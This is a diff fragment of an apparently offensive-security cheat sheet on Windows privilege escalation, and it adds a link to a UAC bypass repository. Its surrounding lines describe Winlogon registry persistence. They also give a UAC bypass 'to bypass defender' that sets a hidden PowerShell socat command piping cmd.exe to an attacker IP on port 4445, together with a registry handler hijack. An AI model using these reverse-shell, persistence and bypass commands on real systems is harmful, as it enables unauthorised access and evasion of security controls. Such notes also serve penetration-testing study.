@@ -216,6 +216,7 @@ Techniques and commands for elevating privileges.
 - **Winlogon persistence method two:** Go to HKCU\Environment in the registry and create a new Expandable String Value named UserInitMprLogonScript for your script.
 
 ## UAC Bypass Methods
+https://github.com/hfiref0x/UACME
 - **UAC Bypass methods for admin privileges (Run from cmd, to bypass defender):** Check your group integrity level with `whoami /groups | find "Label"`, We want high integrity if we want to have admin perms on a process no matter if we are already an admin. If we have medium do the following:
 `set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"`
 `reg add "HKCU\Software\Classes\.Servic3\Shell\Open\command" /d %CMD% /f`
